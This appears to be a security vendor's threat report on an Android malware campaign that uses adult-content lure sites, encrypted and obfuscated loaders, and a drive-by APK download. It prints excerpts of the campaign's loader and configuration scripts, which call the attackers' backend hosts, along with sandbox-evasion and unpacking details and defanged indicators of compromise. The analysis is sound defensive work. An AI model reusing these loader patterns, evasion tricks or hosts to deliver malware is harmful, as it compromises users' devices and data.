# Multi-Stage Android Malware Delivery Campaign

## Authors

- Keerthiraj Nagaraj, Vishwa Thothathri, Nabeel Mohamed, Billy Melicher, Lee Wei Yeong

## Campaign Summary

- **Sophisticated Android Malware Distribution:** This campaign is a sophisticated Android malware distribution network that uses adult content as a social engineering lure.
- **Multi-Stage Architecture:** It employs a resilient, multi-stage architecture with front-end lure sites that use commercial-grade obfuscation and encryption to hide and dynamically connect to a separate backend infrastructure.
- **Obfuscation and Encryption:** The attackers use commercial-grade JavaScript obfuscation from `jsjiami[.]com` in the webpages and Triple DES encryption to hide their backend URLs and configuration data.
- **Evasion Techniques:** The front-end lure sites use deceptive loading messages and a series of checks, including the time it takes to load a test image, to evade detection and analysis.
- **Resilient Infrastructure:** A key highlight from the infrastructure graph is the separation between front-end lures and backend servers. This design enables attackers to quickly change lure domains without exposing their core backend infrastructure, making takedowns more challenging.
- **Dynamic Backend Infrastructure:** The campaign uses a dynamic backend infrastructure with stable IPs but changing subdomains to make it harder to block.
- **Final Payload:**
  - The final impact is the surreptitious download of a malicious APK.
  - This payload is heavily obfuscated, with its core logic hidden in a native .so library to evade analysis.
  - It requests a dangerous combination of permissions, indicating capabilities for phishing overlays, screen capture, installing other malware, and manipulating the file system.
  - The filenames of the APKs vary slightly across different backend servers but maintain a similar naming convention.
  - **Deceptive Branding:** Post-installation, the app uses a generic name like 'first night' to blend in, while its logo uses branding (`CY51[.]TV`) that ties back to the adult-themed lure content, likely to reassure the user of its legitimacy.
  - **Aggressive Permissions & Instability:** The application is unstable and crashes if not granted an extensive list of highly invasive permissions, indicating it has no legitimate functionality and its sole purpose is to execute its malicious capabilities.

## Full Attack Chain

The attack is executed in a series of stages, starting with a sophisticated loader on the front-end domains and culminating in malware delivery from the backend infrastructure.

### Stage 0: Initial Access & Deceptive Loader

The victim is lured to one of the front-end domains (e.g., `0125[.]org`), which serves a malicious HTML loader. This page is not a simple redirect but an active component of the attack. While the malicious scripts execute, the page displays adult-themed animations or GIFs to distract the user.

- File: `hxxps://0125[.]org` (Hosted on `23.231.159[.]78`)

Deception: The page displays a fake loading animation with text like "网络检测中" (Network check in progress) and "正在进入最优线路..." (Now entering the optimal route...). This social engineering tactic keeps the user on the page while the malicious scripts execute in the background.

**Encryption:** The page contains a massive, encrypted Base64-encoded payload. It also imports the legitimate Triple Data Encryption Standard (3DES) cryptographic library from a Baidu CDN to perform the decryption.

```
var jStr = 'fxBRe8ih4/jDnfE9kjoHYp...';
```


**Obfuscation:** The core decryption logic is protected by a commercial obfuscator, identified by the marker:

```
var _0xodk='jsjiami[.]com.v7';
```

**Evasion:** The script employs several anti-analysis techniques. It uses debugger statements to pause code execution, and it will not proceed unless multiple time-based checks succeed, including verifying that the time to load a test image from the backend is within an acceptable range. This prevents detonation in automated analysis sandboxes.

**Decryption & Connection:** The script uses hardcoded keys (`en_key='nW3%gM2&'`) to decrypt the jStr payload. The decrypted plaintext is a list of backend URLs. The script then probes these URLs to find a live one (like `192.250.245[.]109`) and prepares to load content from it into a hidden, full-screen inline frame (`iframe`).

### Stage 1: The HTML Loader (Backend)

After the initial checks are complete, the victim is then redirected to a seemingly empty HTML page served from the backend infrastructure. Its sole function is to act as a "dropper" for the subsequent scripts, which assemble the final lure page.

- **File:** `view-source:hxxps[:]//192.250.245[.]109/?channelCode=hxyd100219`

```
<!DOCTYPE html>
<html lang="zh" style="font-size: 100px;">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0">
    <title></title>
</head>
<body>
</body>
<script type="text/javascript" src="/chuye/cdn_domain.js"></script>
<script type="text/javascript">
	load_js_css(img_data_domain + '/page389/conf/page0389.js', 'js');
</script>
</html>
```

### Stage 2: The Environment Setup Script

This script defines the core functions and global variables used throughout the attack, including a dynamic script loader and a Domain Generation Algorithm (DGA) for creating randomized C2 domains.

- **File:** `hxxps[:]//192.250.245[.]109/chuye/cdn_domain.js`

```
var img_data_domain = '[hxxps[:]//chuye001.oss-accelerate.aliyuncs[.]com](hxxps[:]//chuye001.oss-accelerate.aliyuncs[.]com)';
var o_k = 'hh2enrb1';

function generateRandomString(length) {
  var result = '';
  var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
  for (var i = 0; i < length; i++) {
    var randomIndex = Math.floor(Math.random() * characters.length);
    result += characters.charAt(randomIndex);
  }
  return result;
}
var op_service = "hxxps[:]//" + generateRandomString(15) + ".rjgjds[.]com";
```

### Stage 3: The Configuration and Lure Script

This script is the core of the operation. It dynamically assembles the final lure page, defines its theme, sets up its malicious redirect links, and prepares for the final payload delivery.

- **File:** `hxxps[:]//chuye001.oss-accelerate.aliyuncs[.]com/page389/conf/page0389.js`

```
page_data['seo_title'] = {'type':'seo_title','value':'5Yid5aSc77yN5YWo572R5pyA54Gr5aix5LmQ6KeG6aKR6IGa6ZuG5Zyw'};
page_data['kf_url'] = {'type':'text','value':'[hxxps[:]//rjaupwhep.eoeretnrlaxcrswj[.]top/index?key=c940de1950fd486180df688ad883aff2](hxxps[:]//rjaupwhep.eoeretnrlaxcrswj[.]top/index?key=c940de1950fd486180df688ad883aff2)'};
page_data['tg_url'] = {'type':'text','value':'[hxxps[:]//cy5151[.]tv](hxxps[:]//cy5151[.]tv)'};
page_data['android_jump_time'] = {'type':'int','value':5};
page_data['ios_jump_time'] = {'type':'int','value':5};
load_js_css('img_data_domain/body.js'.replace('img_data_domain', img_data_domain), 'js');
```

### Stage 4: Final Payload Delivery - Android Package Kit (APK) Malware Download

While the user is distracted by the adult-themed animations loading on the page, the scripts initiate a "drive-by download," triggering the download of a malicious APK file from the backend infrastructure. This happens in the background without further user interaction, leading to the compromise of the Android device.

**Payload Analysis:**

This analysis focuses on an APK sample with the following SHA-256 hash:

- `cb1f470dbb311fc5a43b5a74ebdcc5af3316932feecff0599201db9b9932ca98`

This APK sample is heavily fortified to impede analysis.

First, It tries to trip up some static analysis tools by including junk files with extremely long, seemingly randomized alphabetic file names under the assets directory. For example:

- `akaezeicheeCheexahngiNgieGheezooyeeghieKooShaituhiereiruaJicouCiokieReiSeedohseeloojieWahyeequooghahchowaiWohzoogaiyahThohzazoshaiwoovoowoijahcaepezungodeithahphuehoocoothayiexikahngeethughiecujaiShahkuetieSaeyaiJahhahchakeethahneenooYaithozuoduzoopaehaizeiNgooghiongoneeHahwootoimiufaiLiezeleitaepieliezeexaiphohJohchoP`

This produces the error message "File name too long" when the tool tries to extract files from the APK sample for subsequent analysis, a critical first step in the static analysis process.

Second, the `AndroidManifest.xml` declares a different package name from the main one present in the Dalvik EXecutable (DEX) bytecode. The manifest package name is ​​`com.OOcmZ6bP873uGq0s.t2pf8PFQ3b9ASVhO`, while the main one in the DEX bytecode is `com.cabBmMDVlwNhjEaT.jugsHStzeQtdnRVo`. Additionally, there are more activities, mostly non-exported, declared in the manifest, but without accompanying DEX bytecode. Just to name such third-party libraries:

- `com.imnjh.imagepicker.*`
- `com.ms.aar.*`
- `com.rio.*`
- `com.tencent.rtmp.video.*`
- `tech.linjiang.pandora.*`

This discrepancy means there is hidden code that is only loaded and executed dynamically at runtime.

The APK application process requests highly suspicious and dangerous permissions, as declared in the manifest:

 - `SYSTEM_ALERT_WINDOW`: Allows the app to draw over other applications, a technique commonly used for phishing overlays to steal credentials.
 - `QUERY_ALL_PACKAGES`: Enables the malware to get a list of all installed apps on the device, likely for intelligence gathering or targeting other applications.
 - `REQUEST_INSTALL_PACKAGES`: Gives the app the ability to install other packages, turning the compromised device into a platform for further malware delivery.
 - `FOREGROUND_SERVICE_MEDIA_PROJECTION`: Grants screen-capturing capabilities, enabling the theft of sensitive information displayed on the screen.
 - `MOUNT_UNMOUNT_FILESYSTEMS`: A highly privileged permission that allows the app to manipulate filesystems, potentially to hide malicious files or exploit system vulnerabilities.

Next, on a related note, inspecting strings in the main packer native library `libovkaqzjl.so`, we find the metadata indicates that [Obfuscator-LLVM clang version 9.0.1](https://github.com/heroims/obfuscator) was used to obfuscate the code in the library, e.g. Control flow flattening. 

This native library contains the necessary functionality for, and is loaded into both the main entry point `android.app.Application` and `android.app.Activity` instance initialization.

The main `android.app.Application` class declares a total of 396 native functions, but it only invokes one of them (`EHPCKBEYqGbpGzLh`) in the `attachBaseContext` function, and another (`EHPCKBEYqGbpGzLhCreate`) in the `onCreate` function. The arguments supplied to these functions are of varying data types and apparently random junk values, probably to hinder sample analysis efforts. All of them, except the nyrjieqk string argument to the `EHPCKBEYqGbpGzLh` function, which specifies the destination subfolder to extract the secondary third-party native library files (lib*.so) to.

The main `android.app.Activity` class declares a total of 193 native functions, but it only invokes one of them (`dnvDKObLQzVWMdpi`) in the `onCreate` function, similarly with apparently random junk arguments. Other functions e.g., `onStart`, `onResume`, `onPause` etc., are implemented with the default placeholder code, so we will omit these from our analysis here.

This sort of pattern is characteristic of packer tools being applied to the real application code.

The native library makes use of `RegisterNatives` Java Native Interface (JNI) function to associate the native functions declared in the Java class to be linked to the implementations found in the native library, so that it does not have to adhere to the standard JNI naming convention. For example:

- `Java_<fully_qualified_class_name>_<method_name>[__<argument_signature>]`

Analysis of the native library reveals it unpacks files from `classes.dex`. This is accomplished by seeking to append bytes from offset `0x11780` onwards of the `classes.dex` file, and applying the following single-byte independent transformation `~x & 0xfa | x & 5`, for each byte `x`.

The format begins with an `0x80` byte block for the filename, with the `0xff` byte used as padding, as shown in the table below.

| Status        | Bytes or ASCII characters                             |
| ------------- | ----------------------------------------------------- |
| Before (bytes)| `99 96 9b 89 89 9f 89 d4 9e 9f 82 05 05 05 05 05 ...` |
| After (bytes) | `63 6c 61 73 73 65 73 2e 64 65 78 ff ff ff ff ff ...` |
| After (ASCII) | `c  l  a  s  s  e  s  .  d  e  x  PADDINGPADDING ...` |

This block is followed by its associated file contents for that filename. This part is preceded by its filesize, which is specified as a 4-byte double word (`DWORD`), in little-endian format.

After unpacking the files, the native library uses `PathClassLoader` to load the extracted DEX bytecode (`classes.dex`, `classes2.dex`, `...`, `classes6.dex`), eventually leading to the `LoadedApk.makeApplication` function call. Thereafter, it transfers control to the Rio framework (`SealApp`), followed by the Kiwi SDK, all while downloading more configuration e.g. `hxxps[:]//txt.go.sohu[.]com/ip/soip` and media assets along the way.

Furthermore, analysis of this native library also reveals the use of low-level functions such as `gethostbyname`, confirming that network-related activities, like C2 communication, are handled at the native level to evade detection.

Post-installation observations confirm the malicious intent. The app installs with a deceptive name, 初夜 (translated: 'first night'), while its logo displays '`CY51[.]TV`' (`CY` being an abbreviation for Chū Yè), linking it back to the campaign's infrastructure. It occupies a significant 187 MB of storage.

Upon APK application launch, it aggressively requests numerous dangerous permissions (e.g., appear on top, screen capture, install unknown apps, camera, file system access, microphone, phone). If these permissions are denied, the app becomes non-functional and quickly crashes, demonstrating that it has no legitimate purpose beyond its malicious functions.

## Infrastructure Graph

The campaign's infrastructure is designed for resilience and evasion. The front-end lure domains, such as `0125[.]org` and `0131[.]org`, are hosted on a separate server (`23.231.159[.]78`) and are used to redirect users to the backend infrastructure. These domains are linked to a network of hosting sites and share or redirect to similar URLs and files.

The backend infrastructure is hosted on a different set of IP addresses (`192.250.245[.]109` through `.116`), and uses a series of domains with randomized subdomains to make it harder to block. 

## Indicators of Compromise (IoCs)

**IPv4 Addresses**

- Frontend server for the initial lure domains
  - `23.231.159[.]78`
- Backend server hosting scripts
  - `192.250.245[.]109`
  - `192.250.245[.]110`
  - `192.250.245[.]111`
  - `192.250.245[.]112`
  - `192.250.245[.]113`
  - `192.250.245[.]114`
  - `192.250.245[.]115`
  - `192.250.245[.]116`

**Domains**

- Frontend Lure Domains: (all registered on 2025-10-01)
  - `0142[.]org`
  - `0154[.]org`
  - `0131[.]org`
  - `0122[.]org`
  - `0150[.]org`
  - `0153[.]org`
  - `0125[.]org`
  - `0148[.]org`
  - `0126[.]org`
  - `0147[.]org`
- Backend & Redirected Domains/URLs:
  - `chuye001.oss-accelerate.aliyuncs[.]com`
  - `rjgjds[.]com`
  - `eoeretnrlaxcrswj[.]top`
  - `cy5151[.]tv`
  - <subdomain>`.912233[.]shop` (subdomains: `a` to `i`)
  - `pkosjalge.xn--cjrrl00m3uo[.]top`
  - `759zf6jimb6hqlz.xn--xkrs9bw60j[.]top`

**URLs**

- Backend & Redirected Domains/URLs:
  - `hxxps[:]//192.250.245[.]109/chuye/cdn_domain.js`
  - `hxxps[:]//chuye001.oss-accelerate.aliyuncs[.]com/page389/conf/page0389.js`
  - `hxxps[:]//chuye001.oss-accelerate.aliyuncs[.]com/page389/body.js`
  - `hxxps[:]//rjaupwhep.eoeretnrlaxcrswj[.]top/index?key=c940de1950fd486180df688ad883aff2`
  - `hxxps[:]//192.250.245[.]109?channelCode=hxyd100214`
  - `hxxps[:]//192.250.245[.]110?channelCode=hxyd100214`
  - `hxxps[:]//192.250.245[.]111?channelCode=hxyd100214`
  - `hxxps[:]//192.250.245[.]112?channelCode=hxyd100214`
  - `hxxps[:]//192.250.245[.]113?channelCode=hxyd100214`
  - `hxxps[:]//192.250.245[.]114?channelCode=hxyd100214`
  - `hxxps[:]//192.250.245[.]115?channelCode=hxyd100214`
  - `hxxps[:]//192.250.245[.]116?channelCode=hxyd100214`
  - `hxxps[:]//pkosjalge.xn--cjrrl00m3uo[.]top?channelCode=hxyd100214`
  - `hxxps[:]//759zf6jimb6hqlz.xn--xkrs9bw60j[.]top?channelCode=hxyd100214`

**APK Malware Samples**

- SHA256 hash: `ded66571c267ff6b4633ef272480b822aaf509adf12010e3e38fc1f5201e48b0`
- File name: `chuye-p8YtZ-vb8b3ad12-x64.apk`

- SHA256 hash: `cb1f470dbb311fc5a43b5a74ebdcc5af3316932feecff0599201db9b9932ca98`
- File name: `chuye-p8YtZ-ve67cf136-x64.apk`

Note: The filenames of the APKs change slightly from different backend servers but maintain a similar naming format.
